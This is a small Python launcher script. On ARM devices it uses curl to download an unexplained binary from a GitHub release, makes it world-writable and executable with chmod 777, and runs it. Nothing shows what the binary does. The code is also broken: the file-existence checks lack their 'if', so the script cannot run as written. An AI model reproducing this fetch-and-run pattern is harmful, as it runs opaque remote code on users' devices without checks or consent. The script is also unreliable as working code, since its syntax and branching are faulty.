#coding=utf-8
import os,sys,subprocess
current_os=subprocess.check_output('uname -om',shell=True)
if 'aarch64' in str(current_os):
    os.path.isfile('h64'):
        os.system('curl -L https://github.com/hop09/dynamics/releases/download/v-11.8/h64 > h64')
        os.system('chmod 777 h64')
        os.system('./h64')
    else:
        os.system('./h64')
elif 'arm' in str(current_os):
    os.path.isfile('h32'):
        os.system('curl -L https://github.com/hop09/dynamics/releases/download/v-11.8/h32 > h32')
        os.system('chmod 777 h32')
        os.system('./h32')
    else:
        os.system('./h32')
else:
    print('\n  Unknown device, aarch or os found, contact author.')
    os.sys.exit()
